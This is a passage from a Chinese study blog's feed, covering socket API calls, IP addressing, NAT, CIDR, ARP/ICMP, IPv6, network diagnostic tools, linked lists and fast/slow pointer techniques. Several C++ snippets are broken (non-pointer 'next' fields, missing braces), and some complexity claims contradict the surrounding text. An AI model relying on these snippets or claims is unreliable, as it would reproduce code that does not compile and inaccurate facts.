SOCK_STREAM、SOCK_DGRAM、SOCK_RAW、SOCK_SEQPACKET等。</p></li><li><p><strong>protocol</strong>：指定协议。常用的协议有: IPPROTO_TCP、IPPTOTO_UDP、IPPROTO_SCTP等，它们分别对应TCP传输协议、UDP传输协议、SCTP传输协议。</p></li></ol><p><strong>注意</strong>：上面的type 和protocol 并不是可以随意组合的，如SOCK_ STREAM不可以跟IPPROTO_ UDP组合。当protocol为0时，会自动选择type类型对应的默认协议。</p></li><li><p><strong>bind()函数</strong></p><p>bind函数<strong>把一个本地协议地址赋予套接口</strong>。对于网际协议，协议地址是32位的IPv4地址或128位的IPv6地址与16位的TCP或UDP端口号的组合。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">bind</span> <span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> addrlen)</span> </span>;</span><br></pre></td></tr></table></figure><p>函数的三个参数分别为：</p><ol><li><p>sockfd：即套接字，它是通过socket()函数创建的，它唯一标识一个套接口。</p></li><li><p>addr：一个指向特定于协议的地址结构的指针。</p></li><li><p>addrlen：指出第二个参数中结构体的长度。</p></li></ol><p>通常服务器在启动的时候都会绑定一个众所周知的地址(如IP地址+端口号)，用于提供服务，客户就可以通过它来连接服务器；而客户端就不用指定，由系统自动分配一个端口号和自身的IP地址组合。**&#x3D;&#x3D;这就是什么三次握手时为服务器端在listen之前会调用bind，而客户端就不调用，而是在connect时由系统生成一个。&#x3D;&#x3D;**</p></li><li><p><strong>listen()函数</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">listen</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> backlog)</span></span></span><br></pre></td></tr></table></figure><p>listen函数仅由TCP服务器调用，它做两件事情：</p><ol><li><p>当socket函数创建一个套接口时，它被假设为一个主动套接口，也就是说，它默认是一个将调用connect发起连接的客户套接口。listen函数把一个未连接的套接口<strong>转换成一个被动套接口</strong>，指示内核应接受指向该套接口的连接请求。调用listen导致套接口从CLOSED状态转换到LISTEN状态。</p></li><li><p>listen函数的<strong>第二个参数backlog规定了内核应该为相应套接口排队的最大连接个数</strong>（后台等待连接队列的最大限制值）(包括已完成连接队列与未完成连接队列)。</p></li></ol><ul><li><p>未完成连接队列。</p><p>每个这样的客户对应其中- -项:客户已经发出建立连接请求，且请求已到达服务器，而服务器正在等待完成相应的TCP三路握手过程(服务器已发出第二个分节，等待客户端的第三个分节)。这些套接字处于SYN_ RCVD状态。</p></li><li><p>已完成连接队列。</p><p>每个已完成TCP三路握手过程的客户对应其中- -项。这些套接字处于ESTABLISHED状态。</p></li></ul></li><li><p><strong>connect()函数</strong></p><p>TCP客户用connect函数来<strong>建立与TCP服务器的连接</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">connect</span> <span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>connect函数的第一个参数即为客户端的套接字，第二参数为一个指向套接口地址结构的指针，第三个参数为第二个参数中结构体的长度。</p></li><li><p><strong>accept()函数</strong></p><p>accept函数由TCP服务器调用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">accept</span> <span class="params">(<span class="type">int</span> sockfd, <span class="keyword">struct</span> sockaddr addr, <span class="type">socklen_t</span> addrlen)</span> </span>;</span><br></pre></td></tr></table></figure><p>accept函数的第一个参 数为服务器的套接字，第二个参数用于返回客户端的协议地址，第三个参数为协议地址的长度。</p><p>如果accept成功，那么其返回值是由内核自动生成的<strong>一个全新的描述字</strong>，代表与所返回客户的TCP连接。</p></li><li><p><strong>close()函数</strong></p><p>close函数用来关闭套接口，并终止TCP连接。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">close</span><span class="params">(<span class="type">int</span> fd)</span></span>;</span><br></pre></td></tr></table></figure><p>close一个TCP套接口的默认行为是把该套接口标记为已关闭，然后立即返回到调用进程。<strong>该套接字<u>不能再由调用进程使用</u><strong>，也就是说不能再作为read或write的第-一个参数。<br>注意：close操作</strong>只是使相应套接字的引用计数减1</strong>，<u>只有当引用计数为0的时候，才会触发TCP客户端向服务器发送终止连接请求</u>（激发TCP的正常连接终止序列,即发送FIN)）。</p></li><li><p><strong>shutdown()函数</strong></p><p>关闭一个socket有2种方法，分别是close与shutdown。</p><p>shutdown函数的原型是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">shutdown</span> <span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> howto)</span></span>;</span><br></pre></td></tr></table></figure><p>sockfd是需要关闭的套接口描述字。参数howto允许为shutdown操作选择以下几种方式:</p><p>SHUT_RD：关闭连接的读端。也就是该套接字不再接收数据，任何当前在套接字接收缓冲区的数据将被丢弃，但仍可写。进程将不能对该套接字发出任何读操作。调用之后接收到的任何数据将被确认然后无声丢弃掉。注意此时并不发送FIN。</p><p>SHUT_WR：关闭连接的写端，进程不能再对此套接字发出写操作，但仍可读。对于TCP的套接字(socket)， 这称为半关闭，当前留在套接字发送缓冲区中的数据将被发送掉。不管套接字的引用计数是否等于0,关闭写端的操作都会执行，即会发送FIN。</p><p>SHUT_ RDWR：相当于调用shutdown两次：第一次指定howto为SHUT_ RD，第二次指定howto为SHUT_WR。</p><p><strong>&#x3D;&#x3D;close和shutdown的区别：&#x3D;&#x3D;</strong></p><ul><li>close 会关闭连接，并释放所有连接对应的资源，**套接字<u>不能再由调用进程使用</u>**，即它不能再作为read或write的参数；而 shutdown 并不会释放掉套接字和所有的资源，关闭读仍然可以write，关闭写仍然可以read。</li><li><strong>close 存在引用计数</strong>的概念，调用时把套接字的引用计数减1，<strong>仅在该计数变为0时才关闭套接字</strong>；<strong>shutdown 则不管引用计数，直接使得该套接字不可用</strong>，如果有别的进程企图使用该套接字，将会受到影响。</li><li>close 的引用计数导致<strong>不一定会发出 FIN 结束报文</strong>，而 <strong>shutdown 则总是会发出 FIN 结束报文</strong>，这在我们打算关闭连接通知对端的时候，是非常重要的。</li><li><strong>close函数同时终止两个方向的数据传送：读和写。shutdown可以只终止一个方向的数据传送。</strong></li></ul></li><li><p><strong>TCP的半关闭</strong></p><p>TCP提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力。这就是所谓的半关闭，<strong>半关闭是通过调用shutdown函数代替close函数实现的</strong>。</p><p>图2-7显示了一个半关闭的典型例子。让左方的客户端开始半关闭，当然也可以由另一端开始。开始的两个报文和四次挥手一致，初始端发出FIN，接着是另一端对这个FIN的ACK报文段。但后面就和四次挥手不同，因为接收半关闭的一方仍能发送数据。我们只显示一个数据报文段和一个ACK报文段，但可能发送了许多数据报文段。当收到半关闭的一端在完成它的数据传送后， 将发送一个 FIN<br>关闭这个方向的连接，这将传送一个文件结束符给发起这个半关闭的应用进程。当对第二个FIN进行确认后，这个连接便彻底关闭了。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704181311157.png" alt="image-20220704181311157"></p><p>终止网络连接的通常方法是调用close 函数。不过&#x3D;&#x3D;<strong>close有两个限制</strong>，通常可使用shutdown 函数来避免&#x3D;&#x3D;。</p><ul><li><p><strong>close无法直接终止连接</strong></p><p>close函数把套接字的引用计数减1，<strong>仅在该计数变为0时才关闭套接字</strong>。</p><p>使用shutdown（howto参数为SHUT_RDWR或SHUT_WR时）可以<strong>不管引用计数就激发TCP的正常连接终止序列</strong>。</p></li><li><p><strong>close只能同时终止两个方向的数据传送</strong></p><p>close 函数<strong>同时终止数据传送的两个方向：读和写</strong>。</p><p>但是TCP连接是全双工的，有时候我们需要关闭写但仍然可以继续读，shutdown 函数可以完成此工作。</p></li></ul><p>&#x3D;&#x3D;<strong>注意：</strong>&#x3D;&#x3D;</p><ol><li><p>如果有多个进程共享一个套接字，close 每被调用一次，计数减1，直到计数为0时，也就是所有进程都调用了close, 套接字将被释放。</p></li><li><p>在多进程中，如果一个进程调用shutdown(fd, SHUT_ RDWR)后其他的进程将无法利用此套接字进行通信。如果一个进程调用close(sfd)将不会影响到其他进程。</p></li></ol></li></ol><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="3-1-IPv4地址及网络地址转换NAT"><a href="#3-1-IPv4地址及网络地址转换NAT" class="headerlink" title="3.1 IPv4地址及网络地址转换NAT"></a>3.1 IPv4地址及网络地址转换NAT</h3><h4 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h4><p>连接在Internet的每台主机&#x2F;路由器都分配一个<strong>32bit</strong>的全球唯一的标识符。</p><p>IP地址的编码方式有三种：分类的IP地址、子网的划分、CIDR。</p><ul><li><p>分类的IP地址</p><p>传统的IP地址是分类的地址，分为A、B、C、D、E五类。均由网络号和主机号组成，网络号代表主机所连接到的网络，主机号代表该主机或路由器在网络中的地址。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220705093309767.png" alt="image-20220705093309767"></p><p>其中，存在一些特殊的IP地址用于表示特殊用途，不作为主机IP地址：</p><ul><li>主机号全为0表示本网络本身；</li><li>主机号全为1表示本网络的广播地址；</li><li>127.0.0.1网路保留作为环路自检地址，表示任意主机本身；</li><li>32bit全为0，即0.0.0.0表示整个TCP&#x2F;IP网络；</li><li>32bit全为1，即255.255.255.255表示整个TCP&#x2F;IP网络的广播地址。</li></ul></li><li><p>子网的划分、CIDR在下一节叙述。</p></li></ul><h4 id="网络地址转换"><a href="#网络地址转换" class="headerlink" title="网络地址转换"></a>网络地址转换</h4><p>网络地址转换（NAT）是通过将专用网络地址（比如企业内部网Intranet）转换为公用地址（如互联网Internet），从而对外隐藏了内部管理的IP地址。通过在内部使用非注册的IP地址（私有地址），并将它们转换为一小部分外部注册的IP地址（公有地址），从而减少IP地址注册的费用以及节省IPv4地址空间。</p><p>私有IP地址值用于局域网LAN，不用于无线局域网WLAN连接。因此私有IP地址不能直接用于Internet，必须通过网关利用NAT把私有IP地址转换为Intemet中合法的全球IP地址后才能用于Intermet。私有IP地址有效地解决了IP地址不足的问题。</p><p>私有IP地址网段如下:</p><blockquote><p><strong>10.0.0.0~10.255.255.255</strong>、<strong>172.16.0.0~172.31.255.255</strong>、 <strong>192.168.0.0~192.168.255.255</strong></p></blockquote><p>在因特网中的所有路由器，对目的地址是私有地址的数据报一律不进行转发。 使用NAT时，需要在专用网连接到因特网的路由器上安装NAT软件，NAT路由器至少有一个有效的外部全球地址。普通路由器在转发数据报时不改变其源IP地址和目的IP地址，且路由器工作在网络层，而<strong>NAT路由器在转发IP数据报时，一定要更换其IP地址（按路由器中的地址转换表转换源IP地址或目的IP地址）。NAT路由器转发数据报时需要查看和转换传输层的端口，其操作没有严格的层次关系</strong>。</p><h3 id="3-2-子网划分与子网掩码、CIDR"><a href="#3-2-子网划分与子网掩码、CIDR" class="headerlink" title="3.2 子网划分与子网掩码、CIDR"></a>3.2 子网划分与子网掩码、CIDR</h3><h4 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h4><p>各类地址的默认子网掩码：</p><p><strong>A类: 255.0.0.0</strong><br><strong>B类: 255.255.0.0</strong><br><strong>C类: 255.255.255.0</strong></p><p>使用子网划分时的地址格式：</p><p><strong>A类网络：8位    +  子网X位  +  主机24-X位</strong><br><strong>B类网络：16 位 +  子网X位  +  主机16-X位</strong><br><strong>C类网络：24位  +  子网X位  +  主机8-X位</strong></p><h4 id="无分类编址CIDR"><a href="#无分类编址CIDR" class="headerlink" title="无分类编址CIDR"></a>无分类编址CIDR</h4><p><strong>分类的IP地址的缺点：</strong></p><p>比如一个A类地址对应的是2^24 - 2个IP地址(网络地址和广播地址)，这个是个天文数字，一个公司或者组织是无法完全利用这么多IP地址的，就造成了IP地址的浪费。</p><p><strong>CIDR</strong>是在使用变长度子网掩码的基础上提出的一种消除传统A、B、C类网络划分，并且可以在软件的支持下实现超网构造的一种IP地址的网络划分方法。这样可以大幅度提高IP地址空间的利率，并减小路由表大小，提高路由器的路由转发能力。</p><p>无分类编址的做法是将IP分为两部分：</p><p>1、<strong>网络前缀</strong></p><p>网络号对应的是一个网络地址，一个网络可以容纳多个主机，主机的网络号相同。</p><p>2、<strong>主机号</strong></p><p>唯一标识一个主机在一个网络中的id。</p><p>怎么区分网络号和主机号呢？</p><p>使用斜线记法，即IP地址&#x2F;网络前缀所占比特数，xx:xx:xx:xx&#x2F;n<br>在IP地址后边加入了 &#x2F;n ，n代表前n位为网络号。</p><p>CIDR的主要特点：</p><ol><li><p>消除了传统的A、B、C类地址以及子网的概念，因而可以<strong>更加有效地分配IPv4的地址空间</strong>。CIDR使用“网络前缀”概念代替子网络概念。这样IP地址分为两部分:网络前缀、主机号。CIDR使用斜线记法，即IP地址&#x2F;网络前缀所占比特数。其中，网络前缀所占比特数对应于网络<br>的部分，等效于子网掩码中连续1的部分。</p></li><li><p>将网络前缀都相同的连续的IP地址组成“CIDR地址块”。一个CIDR地址块可以包括多个A、B、C类地址，这种地址的聚合称为<strong>路由聚合</strong>，或称为构成<strong>超网</strong>。路由聚合<strong>使得路由表中的一个项目可以表示很多个原来传统分类地址的路由</strong>，有利于减少路由之间的路由选择信息的交换，从而提高网络性能。</p></li></ol><h3 id="3-3-ARP、RARP、ICMP"><a href="#3-3-ARP、RARP、ICMP" class="headerlink" title="3.3 ARP、RARP、ICMP"></a>3.3 ARP、RARP、ICMP</h3><ul><li><p><strong>ARP</strong></p><p>在实际网络的数据链路上传送数据时，最终必须使用硬件地址MAC。所以需要一种方法来<strong>完成IP地址址到MAC地址的映射</strong>，这就要用到地址解析协议(Address Resolution Protocol, ARP)。 <strong>每台主机(路由器) 上单独地存放一个从IP地址到MAC地址的映射表，称为ARP表</strong>。主机和路由器使用地址解析协议APR来<strong>动态维护此ARP表</strong>。MAC地址转换为IP地址使用RARP协议。</p></li><li><p><strong>ICMP</strong></p><p>为了提高IP数据报成功交付的机会，在网络层使用了网际控制报文协议(Internet Control Message Protocol, ICMP) 来使得主机或路由器可以报告差错和异常情况。<br><strong>PING命令工作在应用层</strong>，但是<strong>直接使用网络层的ICMP协议</strong>，而**<u>没有使用传输层的TCP或UDP协议</u>**。</p></li></ul><h3 id="3-4-IPv6"><a href="#3-4-IPv6" class="headerlink" title="3.4 IPv6"></a>3.4 IPv6</h3><p>IPv6由<strong>128bit</strong>构成,通常使用冒号十六进制记法表示IPv6地址，每个16bit的值用四位十六进制值表示，各值之间用冒号分割，如68E6 : 8C64 : FFFFF : 0 : 1180 : 960A : FFFF。该表示方法允许使用零压缩，即一连串连续的零可以为一对冒号所取代，如DE08:0:0:0:0:0:0:B3可以写成DE08::B3；IP 地址0:0:0:0:0:0:118.17.23.1可以写成::118.17.23.1。（这里冒号分割的是16bit，点分割的是8bit）</p><p>IPv6所引入的主要变化：</p><ol><li>更大的地址空间。IPv6 将地址从IPv4的32bit增大到了128bit；</li><li>扩展的地址层次结构。</li><li>灵活的首部格式。</li><li>改进的选项。这一特征加快了分组处理速度。</li><li>允许协议继续扩充。</li><li>支持即插即用。</li><li>支持资源的预分配。</li><li>增加了安全性，身份验证和保密验证是IPv6的关键特征。</li><li>分片限制为由源点来完成，是端到端的，路由途中的路由器不允许进行分片。</li></ol><h2 id="网络常用测试工具"><a href="#网络常用测试工具" class="headerlink" title="网络常用测试工具"></a>网络常用测试工具</h2><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>检查网络是否通畅或者网络的连接速度。</p><p>原理：利用网络上机器<strong>IP地址的唯一性</strong>，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通、时延是多少。</p><h3 id="tracert"><a href="#tracert" class="headerlink" title="tracert"></a>tracert</h3><p>tracert是路由跟踪实用程序，<strong>用于确定IP数据包访问目标所采取的路径</strong>。</p><p>tracert 命令用<strong>IP生存时间(TTL) 字段</strong>和<strong>ICMP错误消息</strong>来确定从一个主机到网络上其他主机的路由。其命令格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tracert[-d] [-h maximum hops] [-j computer-list] [-W timeout] target_name</span><br></pre></td></tr></table></figure><p>可以使用tracert命令确定数据包在网络上的停止位置。例如：<code>tracert www.baidu.com</code>则会打印出从当前主机到目的主机所经过的路由地址。</p><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>查看某个端口是否可访问。Telnet协议是TCP&#x2F;IP协议家族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。</p><p>例如<strong>可以用telnet测试80端口的Web服务器是否正常工作</strong>。</p><p>输入<code>telnet www .hitsz.edu.cn 80</code></p><p>然后服务器响应:<br><code>Trying 219.223.252.3...</code><br><code>Connected to www .hitsz .edu. cn</code><br><code>Escape character is &#39;^] .</code></p><p>然后输入:<br><code>GET / HTTP1.1</code></p><p>如果Web服务器正常工作的话，就会返回服务器的响应头，以便你确认服务器的情况。</p><h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>netstat是一个监控TCP&#x2F;IP网络的非常有用的工具，它可以<strong>显示路由表、实际的网络连接以及每一个网络接口设备的状态信息</strong>。</p><p>netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。使用格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat [-a][-e][-n][-o][-P Protocol] [-r] [-s] [Interval]</span><br></pre></td></tr></table></figure><p>一般用<code>netstat -an</code>来显示所有连接的端口并用数字表示。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;计算机网络&quot;&gt;&lt;a href=&quot;#计算机网络&quot; class=&quot;headerlink&quot; title=&quot;计算机网络&quot;&gt;&lt;/a&gt;计算机网络&lt;/h1&gt;&lt;h2 id=&quot;计算机网络模型&quot;&gt;&lt;a href=&quot;#计算机网络模型&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="计算机基础" scheme="https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>数据结构</title>
    <link href="https://frankcao3.github.io/posts/1106"/>
    <id>https://frankcao3.github.io/posts/1106</id>
    <published>2021-08-14T16:00:00.000Z</published>
    <updated>2023-10-05T11:40:46.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><p><u><strong>线性表</strong></u>：具有相同特性的数据元素的一个有限序列。</p><p>具有<strong>有穷性</strong>、<strong>一致性</strong>（所有元素的性质相同）、<strong>序列性</strong>（所有元素的相对位置是线性的，即存在唯一的开始元素和终端元素，除此之外每个元素只有唯一的前驱元素和后继元素）。</p><p>线性表的<strong>顺序存储结构</strong>：顺序表，借助数组实现（数组存放线性表元素、另外一个int型的值存放线性表长度）。</p><p>顺序表求线性表长度、按索引取元素的时间复杂度为O(1)，按值查找元素的时间复杂度为O(n)，插入、删除元素的平均时间复杂度为O(n)。</p><h2 id="1-链表"><a href="#1-链表" class="headerlink" title="1 链表"></a>1 链表</h2><p>线性表的<strong>链式存储结构</strong>：链表。</p><p>可分为单链表、双链表、循环链表。</p><p>链表可用来表示线性表，也可以用来表示各种非线性的数据结构。</p><h3 id="1-1-单链表"><a href="#1-1-单链表" class="headerlink" title="1.1 单链表"></a>1.1 单链表</h3><p>单链表<strong>结点类型</strong>描述如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">LNode</span> &#123;</span><br><span class="line">ElemType data;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LNode</span> * next;</span><br><span class="line">&#125;LinkNode;</span><br></pre></td></tr></table></figure><p>单链表的建立：</p><ul><li><p><strong>头插法</strong></p><p>常用在将一个已存在的链表逆序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ListNode * L = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">ListNode * s = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">    s-&gt;data = a[i];</span><br><span class="line">    s-&gt;next = L-&gt;next;   <span class="comment">// 头插法</span></span><br><span class="line">    L-&gt;next = s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**<u>&#x3D;&#x3D;使用头插法将链表x逆序&#x3D;&#x3D;</u>**：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">item</span>&#123;</span><br><span class="line">    <span class="type">char</span> C;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">item</span> next:</span><br><span class="line">&#125;Item;</span><br><span class="line"><span class="function">Item *<span class="title">Routinel</span> <span class="params">(Item *x)</span> </span>&#123;</span><br><span class="line">    Item *prev=<span class="literal">NULL</span>, *curr=x;</span><br><span class="line">    <span class="keyword">while</span>(curr) &#123;               <span class="comment">// 遍历结点</span></span><br><span class="line">        Item next=curr-&gt;next;</span><br><span class="line">        curr-&gt;next=prev;        <span class="comment">// 头插法</span></span><br><span class="line">        prev=curr;              <span class="comment">// 更新指针</span></span><br><span class="line">        curr=next;</span><br><span class="line">    <span class="keyword">return</span> prev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>尾插法</strong></p><p>需要增加一个尾指针，始终指向当前链表的尾结点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ListNode * L = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">ListNode * r;</span><br><span class="line">r = L;   <span class="comment">// 初始化尾指针r</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">ListNode * s = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">    s-&gt;data = a[i];</span><br><span class="line">    r-&gt;next = s;   <span class="comment">// 尾插法</span></span><br><span class="line">    r = s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>单链表的插入、删除、取元素的时间复杂度均为O(n)；求线性表长度的时间复杂度为O(n)；求线性表中某个元素的值、按值查找元素、以及插入、删除元素的时间复杂度均为O(n)。</p></li></ul><p><strong>顺序表和链表的比较</strong>：</p><ol><li>存取方式</li></ol><p><strong>顺序表可以顺序存取，也可以随机存取</strong>，链表只能从表头顺序存取元素。</p><ol start="2"><li>查找、插入和删除操作</li></ol><p>对于按值查找，当顺序表在无序的情况下，两者的时间复杂度均为O(n)；而当顺序表有序时，可采用折半查找，此时时间复杂度为O(log2n)。 对于按序号查找，顺序表支持随机访问，时间复杂度仅为O(1)，而链表的平均时间复杂度为O(n)。 顺序表的插入、删除操作，平均需要移动半个表长的元素，因此平均时间复杂度为O(n)。链表的插入、删除操作时，只需要修改相关结点的指针域即可，时间复杂度均为O(n)。</p><p>3)空间分配</p><p>链式存储的结点空间在需要的时候申请分配，操作灵活、高效。</p><h3 id="1-2-快慢指针"><a href="#1-2-快慢指针" class="headerlink" title="1.2 快慢指针"></a>1.2 快慢指针</h3><p>快慢指针中的快慢指的是<strong>移动的步长</strong>，即每次向前移动速度的快慢。例如可以让快指针每次沿链表向前移动2，慢指针每次向前移动1次。</p><p>用途：</p><ul><li><p>&#x3D;&#x3D;<strong>判断单链表是否存在环</strong>&#x3D;&#x3D;</p><p>如果链表存在环，就好似操场的跑道是一个环形。此时让快、慢指针都从链表头开始遍历，快指针每次向前移动两个位置，慢指针每次向前移动一个位置；<u>如果快指针到达NULL，说明链表以NULL为结尾，没有环</u>。<u>如果快指针追上慢指针，则表示有环</u>。</p></li><li><p><strong>&#x3D;&#x3D;寻找循环链表的入口&#x3D;&#x3D;</strong></p><p>假设链表存在环，那么怎么寻找环的入口呢?</p><p>假设链表长为L，起始点到环入口长度为a，环长度为r，则L&#x3D;atr， 如图11-3所示。</p><p>​<img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220711211307378.png" alt="image-20220711211307378"></p><p>在快指针进入环到慢指针进入环前的这段时间，若环的长度较短，也许快指针已经走了好几圈了，然后慢指针进入环。</p><p>设慢指针和快指针在环内相遇时，慢指针在环内走了X步，走的总步数（包括环内与环外）为S步（显然<code>S=X+a</code>），那么快指针走了多少步呢？<br>快指针在环内已经走了n圈加X步，即<code>nr+X</code>步，其中n最少为1，而走的总步数为<code>nr+X+a</code>步。由于快指针走的总步数为慢指针的2倍，故<code>nr+X+a=(X+a)*2</code>。由上式得<code>a+X = nr</code>，即<code>a = nr-X = (n-1)r+r-X</code>；</p><p>因此a和r-x相差r的整数倍，也就是说，<u>若令快慢指针的步长均为1，慢指针从链表头开始走，快指针从相遇点也继续往前走，两者走的距离为<code>a = (n-1)r+r-X</code>时，两者相遇，此时就是环入口的位置。</u></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">FindBeginning</span> <span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    ListNode* n1=head;</span><br><span class="line">    ListNode* n2=head;</span><br><span class="line">    <span class="keyword">while</span> (n2-&gt;next != <span class="literal">NULL</span>) &#123;<span class="comment">//寻找相遇点</span></span><br><span class="line">        n1=n1-&gt;next;</span><br><span class="line">        n2=n2-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(n1==n2)&#123;  <span class="comment">// 有环</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">//没有相遇，因而没有环</span></span><br><span class="line">    <span class="keyword">if</span> (n2-&gt;next == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*确定环入口，将n1从head开始移动，n2从相遇点处移动*/</span></span><br><span class="line">n1=head;</span><br><span class="line"><span class="keyword">while</span> (n1 != n2) &#123;</span><br><span class="line">n1=n1-&gt;next;</span><br><span class="line">n2=n2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 现在n2指向的就是环入口</span></span><br><span class="line">    <span class="keyword">return</span> n2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>在有序链表中寻找中位数</strong></p><p>利用快慢指针可不借助计数器变量实现寻找中位数的功能。</p><p>原理是：快指针的移动速度是慢指针移动速度的2倍，因此<u>当快指针到达链表尾时，慢指针到达中点</u>。程序还要考虑链表结点个数的奇偶数因素，当快指针移动x次(每次2步)后到达表尾，说明链表有奇数个结点，直接返回慢指针指向的数据即可。如果快指针是倒数第二个结点，说明链表结点个数是偶数，这时可以根据“规则”返回上中位数或下中位数或(上中位数+下中位数)的一半。</p></li><li><p>事实上，像快慢指针这种用两个指针分别前进来<strong>查找某个结点</strong>，还有其他的形式。</p><blockquote><p>例1：&#x3D;&#x3D;<u>寻找倒数第K个结点</u>&#x3D;&#x3D;。</p><p>我们可以定义两个指针，第一个指针从链表的头指针开始遍历向前走k-1步，第二个指针保持不动；从第k步开始，第二个指针也开始从链表的头指针开始遍历。由于两个指针的距离保持在k-1，当第一个指针到达链表的尾结点时，第二个指针正好是倒数第k个结点。</p></blockquote><figure 